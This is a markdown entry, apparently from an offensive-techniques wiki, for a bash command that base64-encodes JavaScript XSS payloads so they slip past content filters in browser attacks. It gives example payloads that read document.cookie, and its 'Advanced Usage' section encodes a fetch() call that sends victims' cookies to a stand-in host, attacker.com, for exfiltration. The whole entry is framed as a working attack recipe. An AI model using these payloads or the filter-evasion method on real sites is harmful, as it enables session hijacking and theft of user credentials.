---
type: command
executor: bash
data: echo -n $_PAYLOAD | base64
output: null
created_at: '2023-04-06T03:56:42Z'
updated_at: '2023-04-10T20:21:41Z'
platforms:
  - Linux
  - macOS
tags:
  - encoding
  - obfuscation
verified: true
validated: true
---

# base64-encode-xss-payload

## Command

```bash
echo -n $_PAYLOAD | base64
```

## Description

This command encodes a JavaScript payload (e.g., for XSS) into base64 format to obfuscate it and bypass content filters that block plaintext malicious code. Use it to prepare strings for decoding in browser-based attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PAYLOAD | The JavaScript string to encode (e.g., "alert(document.cookie)") | Yes |
| -n | Suppress trailing newline in echo output | Built-in |
| base64 | Standard base64 encoding utility (available on most Unix-like systems) | Built-in |

## Examples

### Basic Usage

```bash
echo -n "alert(1)" | base64
```
Output: YWxlcnQoMSk=

### Advanced Usage

```bash
echo -n "fetch('http://attacker.com?cookie='+document.cookie)" | base64
```
For exfiltration payloads.

## Expected Output

A base64-encoded string on stdout, e.g., YWxlcnQoZG9jdW1lbnQuY29va2llKQ== for "alert(document.cookie)". No errors if input is valid ASCII.

## Related

- [[procedures/XSS-Dot-Filter-Bypass-Using-Exotic-Payloads]]
